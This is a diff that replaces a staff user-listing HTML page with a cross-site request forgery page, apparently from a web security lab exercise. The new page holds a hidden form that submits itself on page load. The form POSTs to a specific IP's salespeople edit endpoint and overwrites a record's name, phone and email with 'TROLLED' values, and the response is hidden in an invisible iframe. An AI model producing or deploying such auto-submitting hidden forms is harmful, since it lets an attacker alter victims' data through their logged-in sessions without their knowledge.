@@ -1,29 +1,14 @@
-<!doctype html>
-<html lang="en">
+<html>
   <head>
-    <title>Staff: Users</title>
-    <meta charset="utf-8">
-    <meta name="description" content="Staff: Users">
-    <link rel="stylesheet" media="all" href="/red/public/styles.css">
+    <title>NOT A FAKE FORM</title>
   </head>
-  <body>
-<div id="menu">
-  <ul>
-    <li><a href="/red/public/index.php">Public Site</a></li>
-    <li><a href="/red/public/staff/index.php">Staff Menu</a></li>
-    <li><a href="/red/public/staff/logout.php" style="color: red;">Log out</a></li>
-  </ul>
-</div>
-
-<div id="main-content">
-  <h1>Users</h1>
-
-  <a href="new.php">Add a User</a><br />
-  <br />
-
-  <table id="users" style="width: 500px;"><tr><th>First name</th><th>Last name</th><th>Username</th><th></th><th></th></tr><tr><td>Jimmy</td><td>Neutron</td><td>jmonroe99</td><td><a href="show.php?id=1">Show</a></td><td><a href="edit.php?id=1">Edit</a></td></tr><tr><td>Pat</td><td>Person</td><td>pperson</td><td><a href="show.php?id=3">Show</a></td><td><a href="edit.php?id=3">Edit</a></td></tr><tr><td>Bobby</td><td>Tables</td><td>lbtables</td><td><a href="show.php?id=2">Show</a></td><td><a href="edit.php?id=2">Edit</a></td></tr></table>
-</div>
-
+  <body onload="document.my_form.submit()">
+    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="TROLLEDDDD" />
+      <input type="text" name="last_name" value="SORRY_Mr.Barker" />
+      <input type="text" name="phone" value="777-777-7777" />
+      <input type="text" name="email" value="TROLLED@TORLLED.COM" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
   </body>
 </html>
-
